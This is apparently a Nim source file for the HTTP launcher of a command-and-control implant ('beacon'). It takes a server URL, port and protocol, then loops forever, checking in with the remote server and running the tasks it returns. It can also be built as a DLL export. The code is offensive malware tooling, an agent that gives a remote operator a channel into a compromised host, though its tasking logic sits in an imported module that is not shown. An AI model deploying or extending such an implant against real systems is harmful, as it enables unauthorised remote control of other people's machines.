import algorithm
import asyncdispatch
import base64
import json
import std/os

import BeaconHttp


proc error*(message: string, exception: ref Exception) =
    echo message
    echo exception.getStackTrace()


when appType == "lib":
  {.pragma: rtl, exportc, dynlib, cdecl.}
else:
  {.pragma: rtl, }


proc main() {.async, rtl.} = 

    if paramCount() != 3:
        echo "Usage: BeaconHttpLauncher <url> <port> <http/https>"
        return

    var url = paramStr(1)
    var port = paramStr(2)
    var isHttp = paramStr(3)

    var fullUrl = "http://"
    if isHttp == "https":
        fullUrl = "https://"

    fullUrl.add(url)

    var beaconHttp = BeaconHttp()
    beaconHttp.initBeaconHttp(fullUrl, port)
    
    while true:
        try:
          beaconHttp.checkIn()

          beaconHttp.runTasks()

        except:
          let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
          echo "Inside checkIn, got exception ", repr(e), " with message ", msg
          error("stacktrace", e)

        await sleepAsync(beaconHttp.sleepTimeMs)


when appType != "lib":
    waitFor main()
